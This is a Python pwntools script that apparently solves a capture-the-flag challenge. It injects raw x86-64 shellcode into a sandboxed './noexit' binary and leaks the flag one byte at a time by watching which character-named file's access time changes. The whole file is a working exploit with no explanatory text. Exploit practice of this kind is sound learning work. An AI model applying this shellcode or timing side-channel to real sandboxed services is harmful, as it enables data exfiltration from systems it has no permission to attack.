import os
import time
from pwn import *

cwd = "./files"
time_stamp_list = [0 for i in range (0, 126)]
flag = ""
fd_list = []

fd_to_close = [19, 20, 22, 23]
for fd in fd_to_close:
    try:
        os.close(fd)
        print(f"Closed file descriptor {fd}")
    except OSError as e:
        print(f"Error closing file descriptor {fd}: {e}")
for filename in sorted(os.listdir(cwd)):
    file_path = os.path.join(cwd, filename)

    if os.path.isfile(file_path):
        file_fd = os.open(file_path, os.O_RDONLY)
        os.set_inheritable(file_fd, True)
        fd_list.append(file_fd)
        print(f"File Name: {filename}, File Descriptor (fd): {file_fd}")


for i in range(0, 43):
    shellcode = b"\x31\xC0\x48\xC7\xC7\x03\x00\x00\x00\x48\x83\xEC\x3A\x48\x89\xE6\x48\xC7\xC2\x3A\x00\x00\x00\x0F\x05\x31\xC0\x48\x83\xC4"+ i.to_bytes(1, 'big') + b"\x31\xFF\x40\x8A\x3C\x24\x48\x83\xFF\x2E\x74\x14\x40\x80\xEF\x2C\x48\x8D\x35\x09\x00\x00\x00\x48\xC7\xC2\x02\x00\x00\x00\x0F\x05"
    
    for filename in sorted(os.listdir(cwd)):
        file_path = os.path.join(cwd, filename)

        if os.path.isfile(file_path):
            initial_timestamp = time.time()
            os.utime(file_path, (initial_timestamp, initial_timestamp))
            time_stamp_list[ord(filename)] = initial_timestamp

    p = process(['./noexit', './flag'], close_fds=False)
    p.sendline(shellcode)
    p.sendline()
    p.wait()
    no_change = True

    for filename in sorted(os.listdir(cwd)):
        file_path = os.path.join(cwd, filename)

        if os.path.isfile(file_path):
            current_timestamp = os.path.getatime(file_path)
            if current_timestamp != time_stamp_list[ord(filename)]:
                flag += filename
                no_change = False
                break

    if (no_change):
        flag += "."
    print(flag)
